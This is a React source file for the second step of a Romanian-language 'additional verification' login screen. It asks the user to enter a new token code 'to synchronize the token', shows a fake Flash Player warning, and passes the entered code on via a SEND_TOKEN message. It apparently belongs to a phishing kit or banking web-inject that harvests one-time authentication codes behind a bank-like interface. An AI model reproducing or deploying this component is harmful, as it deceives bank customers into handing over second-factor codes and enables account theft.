import React, { useState, useEffect } from 'react'
import { storage } from '../storage/storage'
import { Messaging } from '../utils/messages'
import { UserActions } from '../utils/constants'
import warningIcon from '../media/icon_message-warning.png'
import requiredIcon from '../media/csillag.png'
import { RightPart } from './RightPart'
import { FieldType, CREDENTIALS_DELIMETER } from '../utils/constants'
import { ErrorMsg } from './ErrorMsg'

export const Step_2 = props => {
  const { changeStore, store } = props
  const { step_1_cod, challenge, step_2_cod, error } = store
  const [password, setPassword] = useState(step_2_cod)

  const setError = val => changeStore({ error: val })


  const handleChange = (value) => {
    setPassword(value)
  }

  const handleSubmit = () => {
    if (!password) {
      setError(true)
      return
    }

    Messaging.send({ type: UserActions.SEND_TOKEN, payload: password })

    changeStore({
      step_2_cod: password,
      loading: true
    })

  }

  return (
    <div className="row content-wrapper">
      <div  className="step-wrapper">
        <div className="top-wrapper" />
        <div className="center-wrapper">
          <div className="center-left" />
          <div id="log-container" className="clr">
            <div className="login-title">
              <span style={{marginLeft: 10}}>VERIFICARE SUPLIMENTARA</span>
            </div>
            <div className="login-container">
              <div className="login-description">Te rugam sa introduci un nou cod token mai jos pentru a sincroniza tokenul.</div>
              <div className="login-field">
                <div className="field-name"><label>Sincronizare token:</label></div>
                <div className="field-input"><div className="row-center"><img src={requiredIcon} alt="required" /> </div><input type="password" value={password} style={{backgroundColor: !password && error && 'red'}} value={password} onChange={e => handleChange(e.target.value)}/></div>
              </div>
              
              {error && <ErrorMsg message="Ati introdus token de sincronizare eronat." />}
              <div className="warning-message-container">
                {!error &&
                  <div>
                      <div style={{marginTop: 10}}>
                        <img src={warningIcon} alt="warning-icon" />
                      </div>
                      <div className="warning-message">
                        <div>Avertizare!</div>
                        <div>Unele functii vor fi indisponibile pentru ca nu aveti activat flash player!</div>
                      </div>
                  </div>}
                <div className="btn-wrapper">
                  <div className="btn-general" onClick={handleSubmit}>
                    <span className="btn-general-left"></span>
                    <span className="btn-general-center">Ok</span>
                    <span className="btn-general-right"></span>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="center-right" />
        </div>
        <div className="bottom-wrapper">
          <div className="bottom-left" />
          <div className="bottom-center" />
          <div className="bottom-right" />

        </div>
      </div>
      <div className="right-part-wrapper">
        <RightPart />
      </div>
    </div>
    
    
  )
}


